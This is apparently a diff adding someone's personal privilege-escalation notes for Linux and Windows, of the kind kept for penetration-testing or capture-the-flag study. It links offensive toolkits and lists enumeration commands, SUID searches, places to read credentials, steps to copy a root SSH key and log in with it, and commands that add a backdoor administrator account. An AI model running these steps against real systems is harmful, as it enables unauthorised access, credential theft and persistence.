@@ -1,0 +1,80 @@
+
+
+book.hacktricks.xyz
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+https://gtfobins.github.io/ -> sudo exploit
+
+LIN:
+
+
+	Exploiting SUID binaries
+	Kernel exploits
+	Sudo misconfigurations
+	Cron job vulnerabilities
+	
+	sudo su -
+	sudo -l
+
+	!look 4 installed softwares!
+
+	dpkg -l	
+	uname -a
+	cat /proc/version
+	cat /etc/issue
+	ps
+	ps -A
+	ps aux			- processes for all users, who started them and x - xternal processes (to terminal)
+	env             - will show environment vars
+	cat /etc/passwd | cut -d ":" -f 1
+	find / -perm -u=s -type f 2>/dev/null	- finds files with SUID bit set
+	
+	./linpeas.sh
+	
+	Note: Linpeas will run many commands known for identifying vulnerabilities and create a lot of "noise" that may trigger anti-virus software or security monitoring software that looks for these types of events. This may prevent the scripts from running or even trigger an alarm that the system has been compromised. In some instances, we may want to do a manual enumeration instead of running scripts.
+	
+	
+
+	cron jobs ->if write permission-> /etc/crontab
+						  /etc/cron.d
+						  /var/spool/cron/crontabs/root
+
+	SSH keys: ->if read permission-> /home/user/.ssh/id_rsa
+							/root/.ssh/id_rsa
+				If we can read the /root/.ssh/ directory and can read the id_rsa file, we can copy it to our machine and use the -i flag to log in with it:  vim id_rsa
+					chmod 600 id_rsa
+					ssh user@10.10.10.10 -i id_rsa
+
+
+
+https://github.com/rebootuser/LinEnum.git
+
+https://github.com/sleventyeleven/linuxprivchecker
+
+
+WIN:
+		scheduled tasks
+
+		https://lolbas-project.github.io/#
+
+		https://github.com/GhostPack/Seatbelt
+
+		https://github.com/411Hall/JAWS
+
+
+		both:
+
+		https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
+		
+		It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml
+		or C:\xampp\FileZilla Server\FileZilla Server.xml
+		These can be MD5 hashes or in plaintext, depending on the version.
+		
+		if we got a win revshell its usually admin/system usr. we can then
+		
+		net user <username> <password> /add
+
+		net localgroup administrators <username> /add
+		
+
+
+
